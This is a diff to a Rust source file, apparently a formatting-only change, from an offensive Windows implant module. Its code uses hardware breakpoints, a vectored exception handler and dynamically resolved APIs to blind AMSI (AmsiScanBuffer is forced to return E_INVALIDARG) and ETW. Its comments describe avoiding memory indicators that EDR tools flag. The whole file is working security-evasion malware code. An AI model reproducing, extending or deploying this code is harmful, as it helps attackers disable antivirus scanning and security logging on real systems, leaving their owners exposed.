@@ -91,7 +91,8 @@ static mut SHADOW_BUF: *mut u8 = core::ptr::null_mut();
 
 /// Runtime switch for diag() file writes. Defaults OFF in production.
 /// Set to true via `set_diag_enabled(true)` during selftest only.
-pub(crate) static DIAG_ENABLED: core::sync::atomic::AtomicBool = core::sync::atomic::AtomicBool::new(false);
+pub(crate) static DIAG_ENABLED: core::sync::atomic::AtomicBool =
+    core::sync::atomic::AtomicBool::new(false);
 
 /// Enable/disable diag() file writes at runtime.
 pub fn set_diag_enabled(on: bool) {
@@ -115,29 +116,55 @@ unsafe fn diag(ch: u8) {
     path[name.len()] = 0;
 
     type FnCreate = unsafe extern "system" fn(
-        *const u16, u32, u32, *mut core::ffi::c_void, u32, u32, *mut core::ffi::c_void,
+        *const u16,
+        u32,
+        u32,
+        *mut core::ffi::c_void,
+        u32,
+        u32,
+        *mut core::ffi::c_void,
     ) -> *mut core::ffi::c_void;
     type FnWrite = unsafe extern "system" fn(
-        *mut core::ffi::c_void, *const u8, u32, *mut u32, *mut core::ffi::c_void,
+        *mut core::ffi::c_void,
+        *const u8,
+        u32,
+        *mut u32,
+        *mut core::ffi::c_void,
     ) -> i32;
     type FnClose = unsafe extern "system" fn(*mut core::ffi::c_void) -> i32;
     type FnSetFP = unsafe extern "system" fn(*mut core::ffi::c_void, i32, *mut i32, u32) -> u32;
 
     let Some(cf) = crate::resolve::export_addr(b"kernelbase.dll", b"CreateFileW")
         .or_else(|| crate::resolve::export_addr(b"kernel32.dll", b"CreateFileW"))
-    else { return };
+    else {
+        return;
+    };
     let Some(wf) = crate::resolve::export_addr(b"kernelbase.dll", b"WriteFile")
         .or_else(|| crate::resolve::export_addr(b"kernel32.dll", b"WriteFile"))
-    else { return };
+    else {
+        return;
+    };
     let Some(ch_) = crate::resolve::export_addr(b"kernelbase.dll", b"CloseHandle")
         .or_else(|| crate::resolve::export_addr(b"kernel32.dll", b"CloseHandle"))
-    else { return };
+    else {
+        return;
+    };
     let create_file: FnCreate = core::mem::transmute(cf);
     let write_file: FnWrite = core::mem::transmute(wf);
     let close_handle: FnClose = core::mem::transmute(ch_);
 
-    let h = create_file(path.as_ptr(), 4, 3, core::ptr::null_mut(), 4, 0x80, core::ptr::null_mut());
-    if h as isize == -1 { return; }
+    let h = create_file(
+        path.as_ptr(),
+        4,
+        3,
+        core::ptr::null_mut(),
+        4,
+        0x80,
+        core::ptr::null_mut(),
+    );
+    if h as isize == -1 {
+        return;
+    }
     if let Some(sfp) = crate::resolve::export_addr(b"kernelbase.dll", b"SetFilePointer")
         .or_else(|| crate::resolve::export_addr(b"kernel32.dll", b"SetFilePointer"))
     {
@@ -192,9 +219,7 @@ pub unsafe fn init_shadow_buffer() -> bool {
     // Downgrade page protection: PAGE_READWRITE → PAGE_EXECUTE_READ (0x20).
     // Shadow stubs are written once and never modified; RX is sufficient and
     // closes the RWX IOC that EDR/PE-sieve would flag.
-    type FnVP = unsafe extern "system" fn(
-        *mut core::ffi::c_void, usize, u32, *mut u32,
-    ) -> i32;
+    type FnVP = unsafe extern "system" fn(*mut core::ffi::c_void, usize, u32, *mut u32) -> i32;
     let vp_addr = crate::resolve::export_addr(b"kernelbase.dll", b"VirtualProtect")
         .or_else(|| crate::resolve::export_addr(b"kernel32.dll", b"VirtualProtect"));
     if let Some(vp) = vp_addr {
@@ -250,10 +275,14 @@ pub unsafe fn read_veh_diag() -> [u8; 128] {
 
 #[no_mangle]
 pub unsafe extern "system" fn hwbp_veh_handler(ep: usize) -> i32 {
-    if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) { vehtag(b'V'); } // VEH entered
+    if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) {
+        vehtag(b'V');
+    } // VEH entered
 
     if ep == 0 {
-        if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) { vehtag(b'0'); }
+        if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) {
+            vehtag(b'0');
+        }
         return EXCEPTION_CONTINUE_SEARCH;
     }
 
@@ -262,7 +291,9 @@ pub unsafe extern "system" fn hwbp_veh_handler(ep: usize) -> i32 {
     let exr = core::ptr::read_unaligned(ep_ptr as *const usize) as *const u8;
     let ctx = core::ptr::read_unaligned(ep_ptr.add(8) as *const usize) as *mut u8;
     if exr.is_null() || ctx.is_null() {
-        if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) { vehtag(b'N'); } // null pointers
+        if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) {
+            vehtag(b'N');
+        } // null pointers
         return EXCEPTION_CONTINUE_SEARCH;
     }
 
@@ -271,7 +302,9 @@ pub unsafe extern "system" fn hwbp_veh_handler(ep: usize) -> i32 {
     if code != STATUS_SINGLE_STEP {
         return EXCEPTION_CONTINUE_SEARCH;
     }
-    if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) { vehtag(b'S'); } // STATUS_SINGLE_STEP confirmed
+    if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) {
+        vehtag(b'S');
+    } // STATUS_SINGLE_STEP confirmed
 
     // Read DR6 — bits 0–3 indicate which slot triggered.
     // DR6 is in the CONTEXT at offset 0x068 (u64).
@@ -283,10 +316,14 @@ pub unsafe extern "system" fn hwbp_veh_handler(ep: usize) -> i32 {
     let slot_bits = dr6 & 0xF;
     if slot_bits == 0 {
         // No B0–B3 set → not a hardware breakpoint trigger, pass through.
-        if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) { vehtag(b'b'); } // no B bits
+        if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) {
+            vehtag(b'b');
+        } // no B bits
         return EXCEPTION_CONTINUE_SEARCH;
     }
-    if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) { vehtag(b'b' + slot_bits as u8); } // which slot(s)
+    if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) {
+        vehtag(b'b' + slot_bits as u8);
+    } // which slot(s)
 
     // ContextRecord.Rip at x64 CONTEXT offset 0x0F8
     let rip = core::ptr::read_unaligned(ctx.add(CTX_RIP) as *const u64) as usize;
@@ -296,15 +333,15 @@ pub unsafe extern "system" fn hwbp_veh_handler(ep: usize) -> i32 {
         if (slot_bits & (1 << i)) == 0 {
             continue;
         }
-        let entry = core::ptr::read_volatile(
-            &HWBP_ENTRIES[i as usize] as *const Option<HwbpEntry>,
-        );
+        let entry = core::ptr::read_volatile(&HWBP_ENTRIES[i as usize] as *const Option<HwbpEntry>);
         if let Some(ref e) = entry {
             // Verify: RIP or ExceptionAddress should match our target
             let fault_addr = core::ptr::read_unaligned(exr.add(0x10) as *const usize);
             if fault_addr == e.target || rip == e.target {
                 // ====== HIT: redirect to shadow stub ======
-                if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) { vehtag(b'R'); } // redirecting
+                if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) {
+                    vehtag(b'R');
+                } // redirecting
 
                 // Clear DR6 — Windows doesn't auto-clear it, and stale bits
                 // cause misidentification on the next exception.
@@ -315,12 +352,8 @@ pub unsafe extern "system" fn hwbp_veh_handler(ep: usize) -> i32 {
 
                 // Set Resume Flag (EFLAGS bit 16) — tells CPU to skip the
                 // HWBP trigger for exactly ONE instruction (the shadow stub).
-                let eflags =
-                    core::ptr::read_unaligned(ctx.add(CTX_EFLAGS) as *const u32);
-                core::ptr::write_unaligned(
-                    ctx.add(CTX_EFLAGS) as *mut u32,
-                    eflags | RF_BIT,
-                );
+                let eflags = core::ptr::read_unaligned(ctx.add(CTX_EFLAGS) as *const u32);
+                core::ptr::write_unaligned(ctx.add(CTX_EFLAGS) as *mut u32, eflags | RF_BIT);
 
                 // We need CONTEXT_CONTROL (at minimum) to apply EFlags+Rip,
                 // and CONTEXT_DEBUG_REGISTERS to apply DR6 clear. Set the
@@ -331,13 +364,17 @@ pub unsafe extern "system" fn hwbp_veh_handler(ep: usize) -> i32 {
                     flags | CONTEXT_DEBUG_REGISTERS | CONTEXT_CONTROL,
                 );
 
-                if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) { vehtag(b'X'); } // done
+                if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) {
+                    vehtag(b'X');
+                } // done
                 return EXCEPTION_CONTINUE_EXECUTION;
             }
         }
     }
 
-    if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) { vehtag(b'M'); } // no match
+    if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) {
+        vehtag(b'M');
+    } // no match
     EXCEPTION_CONTINUE_SEARCH
 }
 
@@ -372,12 +409,18 @@ pub unsafe fn add_hwbp(target_addr: usize, shadow_type: ShadowType) -> Result<us
     }
     let shadow = match shadow_addr(shadow_type) {
         Some(s) => s,
-        None => { diag(b'2'); return Err("invalid shadow type"); }
+        None => {
+            diag(b'2');
+            return Err("invalid shadow type");
+        }
     };
     diag(b'b'); // shadow addr OK
     let slot = match HWBP_ENTRIES.iter().position(|e| e.is_none()) {
         Some(s) => s,
-        None => { diag(b'3'); return Err("all 4 DR slots full"); }
+        None => {
+            diag(b'3');
+            return Err("all 4 DR slots full");
+        }
     };
     diag(b'c'); // slot found
 
@@ -385,25 +428,38 @@ pub unsafe fn add_hwbp(target_addr: usize, shadow_type: ShadowType) -> Result<us
     type FnCtx = unsafe extern "system" fn(usize, usize) -> i32;
     let ntgct_addr = match crate::resolve::export_addr(b"ntdll.dll", b"NtGetContextThread") {
         Some(a) => a,
-        None => { diag(b'H'); return Err("NtGetContextThread unresolved"); }
+        None => {
+            diag(b'H');
+            return Err("NtGetContextThread unresolved");
+        }
     };
     let ntgct: FnCtx = core::mem::transmute(ntgct_addr);
     let ntsct_addr = match crate::resolve::export_addr(b"ntdll.dll", b"NtSetContextThread") {
         Some(a) => a,
-        None => { diag(b'J'); return Err("NtSetContextThread unresolved"); }
+        None => {
+            diag(b'J');
+            return Err("NtSetContextThread unresolved");
+        }
     };
     let ntsct: FnCtx = core::mem::transmute(ntsct_addr);
 
     // Register VEH if not done (MUST be before setting breakpoints).
     if VEH_HANDLE.is_null() {
         diag(b'd'); // registering VEH
-        let addr = match crate::resolve::export_addr(b"kernelbase.dll", b"AddVectoredExceptionHandler") {
-            Some(a) => a,
-            None => match crate::resolve::export_addr(b"kernel32.dll", b"AddVectoredExceptionHandler") {
+        let addr =
+            match crate::resolve::export_addr(b"kernelbase.dll", b"AddVectoredExceptionHandler") {
                 Some(a) => a,
-                None => { diag(b'D'); return Err("AVEH unresolved"); }
-            }
-        };
+                None => match crate::resolve::export_addr(
+                    b"kernel32.dll",
+                    b"AddVectoredExceptionHandler",
+                ) {
+                    Some(a) => a,
+                    None => {
+                        diag(b'D');
+                        return Err("AVEH unresolved");
+                    }
+                },
+            };
         diag(b'x'); // addr resolved
         type AddVEH = unsafe extern "system" fn(
             usize,
@@ -425,10 +481,16 @@ pub unsafe fn add_hwbp(target_addr: usize, shadow_type: ShadowType) -> Result<us
         .or_else(|| crate::resolve::export_addr(b"kernel32.dll", b"VirtualAlloc"))
     {
         Some(a) => a,
-        None => { diag(b'F'); return Err("VirtualAlloc unresolved"); }
+        None => {
+            diag(b'F');
+            return Err("VirtualAlloc unresolved");
+        }
     };
     type VAlloc = unsafe extern "system" fn(
-        *mut core::ffi::c_void, usize, u32, u32,
+        *mut core::ffi::c_void,
+        usize,
+        u32,
+        u32,
     ) -> *mut core::ffi::c_void;
     let vaf: VAlloc = core::mem::transmute(va_addr);
     let ctx_buf = vaf(core::ptr::null_mut(), 1232, 0x3000, 0x04);
@@ -573,8 +635,11 @@ pub unsafe fn remove_hwbp(slot: usize) -> Result<(), &'static str> {
 
     // Remove VEH when no more breakpoints are active.
     if HWBP_COUNT == 0 && !VEH_HANDLE.is_null() {
-        if let Some(a) = crate::resolve::export_addr(b"kernelbase.dll", b"RemoveVectoredExceptionHandler")
-            .or_else(|| crate::resolve::export_addr(b"kernel32.dll", b"RemoveVectoredExceptionHandler"))
+        if let Some(a) =
+            crate::resolve::export_addr(b"kernelbase.dll", b"RemoveVectoredExceptionHandler")
+                .or_else(|| {
+                    crate::resolve::export_addr(b"kernel32.dll", b"RemoveVectoredExceptionHandler")
+                })
         {
             type RemoveVEH = unsafe extern "system" fn(*mut core::ffi::c_void) -> u32;
             let f: RemoveVEH = core::mem::transmute(a);
@@ -613,7 +678,7 @@ pub unsafe fn blind_etw_hwbp() -> Result<usize, &'static str> {
 
 /// Set HWBP on `amsi!AmsiScanBuffer` → shadow returns E_INVALIDARG (AMSI suppressed).
 pub unsafe fn blind_amsi_hwbp() -> Result<usize, &'static str> {
-    let addr = crate::resolve::export_addr(b"amsi.dll", b"AmsiScanBuffer")
-        .ok_or("amsi not loaded")?;
+    let addr =
+        crate::resolve::export_addr(b"amsi.dll", b"AmsiScanBuffer").ok_or("amsi not loaded")?;
     add_hwbp(addr, ShadowType::AmsiInvalidArg)
 }
